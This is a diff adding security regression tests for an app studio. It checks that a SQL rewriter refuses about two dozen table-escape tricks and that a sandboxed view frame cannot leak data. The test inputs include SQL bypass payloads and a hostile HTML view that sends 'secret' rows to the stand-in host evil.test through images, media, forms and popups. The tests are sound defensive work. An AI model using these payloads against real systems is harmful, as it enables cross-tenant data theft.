@@ -49,6 +49,59 @@ test('only SELECTs over the app\'s own tables', () => {
   assert.throws(() => rewriteSql('SELECT 1; DROP TABLE tasks', T, P), /one statement/);
 });
 
+// Audit G-B1: each of these reached another table unchecked. Every one must
+// be refused, whatever the message.
+test('app.sql cannot reach a table outside the app by quoting, commas, comments or odd tokens', () => {
+  const reach = [
+    'SELECT * FROM "sa_people"',
+    'SELECT * FROM `sa_people`',
+    'SELECT * FROM tasks, sa_people',
+    'SELECT * FROM tasks t, sa_people p WHERE t.id = p.id',
+    'SELECT * FROM tasks JOIN tags ON tags.task = tasks.id, sa_people',
+    'SELECT * FROM/**/sa_people',
+    'SELECT * FROM /* x */ sa_people',
+    'SELECT * FROM tasks WHERE id IN (SELECT id FROM/**/sa_sessions)',
+    // A CTE's name counts only inside the query that defines it.
+    'SELECT * FROM sa_people, (WITH sa_people AS (SELECT 1 AS x) SELECT * FROM sa_people) q',
+    'SELECT * FROM (WITH sa_people AS (SELECT 1 AS x) SELECT * FROM sa_people) q, sa_people',
+    // The tokenizer must end strings where ChloeDB's (sqlparser) does.
+    "SELECT E'x\\'' AS a, (SELECT email FROM sa_people) AS b, ''' AS c FROM tasks",
+    "SELECT $$ ' $$ AS a FROM sa_people --'",
+    "SELECT R'x' AS a FROM tasks",
+    // Number forms that end before a keyword: 1L, 0x, "1." then FROM.
+    'SELECT 1LFROM sa_people',
+    'SELECT 1.FROM sa_people',
+    'SELECT * FROM tasks 0xJOIN sa_people ON 1 = 1',
+    // Other ways to name a table.
+    'FROM sa_people SELECT *',
+    '(TABLE sa_people)',
+    'SELECT * FROM tasks |> JOIN sa_people ON 1 = 1',
+    'SELECT * FROM main.sa_people',
+    'SELECT * FROM tasks CROSS APPLY sa_people',
+    'SELECT * INTO sa_copy FROM tasks',
+    'SELECT * FROM LATERAL sa_people',
+    'SELECT * FROM (sa_people)',
+  ];
+  for (const sql of reach) {
+    assert.throws(() => rewriteSql(sql, T, P), Error, sql);
+  }
+  // And the shapes apps write stay as they were.
+  assert.equal(rewriteSql('SELECT * FROM tasks, tags WHERE tags.task = tasks.id', T, P).sql,
+    'SELECT * FROM app_abc123_tasks AS tasks, app_abc123_tags AS tags WHERE tags.task = tasks.id');
+  assert.equal(rewriteSql('SELECT "title" FROM tasks -- the list\n', T, P).sql,
+    'SELECT "title" FROM app_abc123_tasks AS tasks -- the list');
+  assert.equal(rewriteSql('SELECT x IS DISTINCT FROM y AS d, SUBSTRING(title FROM 2) AS s, TRIM(BOTH FROM title) AS t FROM tasks', T, P).sql,
+    'SELECT x IS DISTINCT FROM y AS d, SUBSTRING(title FROM 2) AS s, TRIM(BOTH FROM title) AS t FROM app_abc123_tasks AS tasks');
+  assert.equal(rewriteSql('SELECT * FROM (SELECT * FROM tasks) t JOIN (SELECT * FROM tags) g ON g.task = t.id', T, P).sql,
+    'SELECT * FROM (SELECT * FROM app_abc123_tasks AS tasks) t JOIN (SELECT * FROM app_abc123_tags AS tags) g ON g.task = t.id');
+  assert.equal(rewriteSql('SELECT t.from, :from AS f FROM tasks t WHERE t.at >= :from', T, P).sql,
+    'SELECT t.from, :from AS f FROM app_abc123_tasks t WHERE t.at >= :from');
+  assert.equal(rewriteSql('WITH a AS (SELECT * FROM tasks), b (n) AS (SELECT COUNT(*) FROM a) SELECT * FROM a, b', T, P).sql,
+    'WITH a AS (SELECT * FROM app_abc123_tasks AS tasks), b (n) AS (SELECT COUNT(*) FROM a) SELECT * FROM a, b');
+  assert.equal(rewriteSql('SELECT title FROM tasks UNION ALL SELECT name FROM people ORDER BY 1', T, P).sql,
+    'SELECT title FROM app_abc123_tasks AS tasks UNION ALL SELECT name FROM app_abc123_people AS people ORDER BY 1');
+});
+
 test('the answer parser keeps code verbatim', () => {
   const text = '<plan>{"views":[{"slug":"v1"}]}</plan>\n<code slug="v1">\nconst x = "</div>";\nroot.append(x)\n</code>';
   const { plan, code } = parseAnswer(text);
@@ -1585,6 +1638,97 @@ test('the library SQL functions run in Strata', async (t) => {
   } finally {
     child.kill();
   }
+});
+
+// Audit G-B1's backstop: whatever the rewrite lets through, the server's
+// plan says which tables a query reads, and one outside the app's is refused.
+test('the server\'s plan of an app query may read only the app\'s tables', async (t) => {
+  const { findServerBinary, startServer } = await import('../engine/strata.mjs');
+  const { checkReads, tablesOfPlan } = await import('../engine/sql.mjs');
+  const bin = findServerBinary(join(import.meta.dirname, '..', '..'));
+  if (!bin) return noServer(t);
+  const dir = mkdtempSync(join(tmpdir(), 'sa-reads-'));
+  const port = await new Promise((r) => { const s = net.createServer().listen(0, '127.0.0.1', () => { const p = s.address().port; s.close(() => r(p)); }); });
+  const { child, client } = await startServer({ bin, db: join(dir, 'apps.strata'), listen: `127.0.0.1:${port}`, log: () => {} });
+  try {
+    await client.sql('CREATE TABLE app_x1_tasks (id KEYWORD PRIMARY KEY, title TEXT)');
+    await client.sql('CREATE TABLE sa_people (id KEYWORD PRIMARY KEY, email KEYWORD)');
+    await client.write([{ op: 'upsert', table: 'app_x1_tasks', doc: { id: 'a', title: 'one' } }, { op: 'upsert', table: 'sa_people', doc: { id: 'a', email: 'x@example.com' } }]);
+    const own = ['app_x1_tasks'];
+    await checkReads(client, 'SELECT * FROM app_x1_tasks AS tasks', {}, own);
+    assert.deepEqual([...tablesOfPlan((await client.explain('SELECT * FROM app_x1_tasks AS tasks', {})).ir)], ['app_x1_tasks']);
+    await assert.rejects(checkReads(client, 'SELECT * FROM "sa_people"', {}, own), /reads sa_people/);
+    await assert.rejects(checkReads(client, 'SELECT * FROM app_x1_tasks AS tasks JOIN "sa_people" p ON p.id = tasks.id', {}, own), /reads sa_people/);
+    await assert.rejects(checkReads(client, 'SELECT * FROM app_x1_tasks WHERE id IN (SELECT id FROM sa_people)', {}, own), /reads sa_people/);
+    await assert.rejects(checkReads(client, 'WITH p AS (SELECT * FROM sa_people) SELECT * FROM p', {}, own), /reads sa_people/);
+    // And through the engine, as a view's app.sql reaches it.
+    const { Engine } = await import('../engine/engine.mjs');
+    const engine = new Engine(client, { log: () => {} });
+    engine.view = async () => ({ tables: [{ spec: { name: 'tasks' } }] });
+    assert.deepEqual((await engine.sql('x1', 'SELECT title FROM tasks')).map((r) => r.title), ['one']);
+    await assert.rejects(engine.sql('x1', 'SELECT * FROM tasks JOIN "sa_people" p ON p.id = tasks.id'), /quotes/);
+    await assert.rejects(engine.sql('x1', 'SELECT * FROM tasks WHERE id IN (SELECT id FROM/**/sa_people)'), /block comments/);
+  } finally {
+    child.kill();
+  }
+});
+
+// Audit G-B2: a view's frame sent rows out through an image's URL or a popup.
+// In Chromium, a frame with the studio's sandbox and policy runs what a
+// hostile view would, and nothing reaches another host.
+test('a view frame cannot send data out through images, media, forms or popups', async (t) => {
+  const { frameCsp, FRAME_SANDBOX, linkToOpen, PHOTO_HOSTS } = await import('../web/policy.js');
+  const csp = frameCsp('http://127.0.0.1:1');
+  assert.doesNotMatch(csp, /img-src[^;]*https:(\s|;|$)/);
+  assert.match(csp, /form-action 'none'/);
+  assert.match(frameCsp('http://127.0.0.1:1', { hosts: ['*'] }), /img-src data: blob: http:\/\/127\.0\.0\.1:1 https:;/);
+  // Allowed hosts (and their subdomains) only; a name that is not a host adds nothing.
+  const some = frameCsp('http://127.0.0.1:1', { hosts: ['api.example.com', "x.com; script-src *", 'bad host'] });
+  assert.match(some, /img-src [^;]* https:\/\/api\.example\.com https:\/\/\*\.api\.example\.com;/);
+  assert.doesNotMatch(some, /img-src[^;]*https:(\s|;|$)|x\.com|bad/);
+  assert.ok(PHOTO_HOSTS.every((h) => csp.includes(h)));
+  assert.doesNotMatch(FRAME_SANDBOX, /allow-popups|allow-same-origin|allow-top-navigation/);
+  assert.equal(linkToOpen('javascript:alert(1)'), null);
+  assert.equal(linkToOpen('https://example.com/a'), 'https://example.com/a');
+  const { loadPlaywright } = await import('../engine/checks.mjs');
+  const pw = loadPlaywright();
+  if (!pw) return t.skip('no playwright');
+  const browser = await pw.chromium.launch();
+  try {
+    // A hostile view, in a frame made as the studio makes one.
+    const view = `<!doctype html><html><head><meta http-equiv="Content-Security-Policy" content="${frameCsp('https://studio.test')}"></head><body>
+<form id="f" action="https://evil.test/form" method="get"><input name="rows" value="secret"></form>
+<a id="l" href="https://evil.test/link?rows=secret" target="_blank">x</a>
+<script>
+  new Image().src = 'https://evil.test/img?rows=secret';
+  const v = document.createElement('video'); v.src = 'https://evil.test/media?rows=secret'; document.body.append(v);
+  try { window.open('https://evil.test/open?rows=secret'); } catch (e) {}
+  try { document.getElementById('f').submit(); } catch (e) {}
+  new Image().src = 'https://studio.test/api/tiles/1/0/0.png';
+</script></body></html>`;
+    const ctx = await browser.newContext();
+    const seen = [];
+    await ctx.route('**/*', (r) => {
+      const u = r.request().url();
+      seen.push(u);
+      return r.fulfill(u === 'https://studio.test/' ? { contentType: 'text/html', body: '<!doctype html><body></body>' } : { status: 204, body: '' });
+    });
+    const page = await ctx.newPage();
+    await page.goto('https://studio.test/');
+    await page.evaluate(([sandbox, doc]) => {
+      const f = document.createElement('iframe');
+      f.setAttribute('sandbox', sandbox);
+      f.srcdoc = doc;
+      document.body.append(f);
+    }, [FRAME_SANDBOX, view]);
+    await page.waitForTimeout(800);
+    await page.frames()[1].click('#l', { timeout: 2000 }).catch(() => {});
+    await page.waitForTimeout(800);
+    assert.deepEqual(seen.filter((u) => u.includes('evil.test')), []);
+    assert.deepEqual(ctx.pages().length, 1);
+    // An image from the engine itself still loads.
+    assert.ok(seen.includes('https://studio.test/api/tiles/1/0/0.png'), seen.join(' '));
+  } finally { await browser.close(); }
 });
 
 // Against a real chloedb-server: what people do is stored with its columns
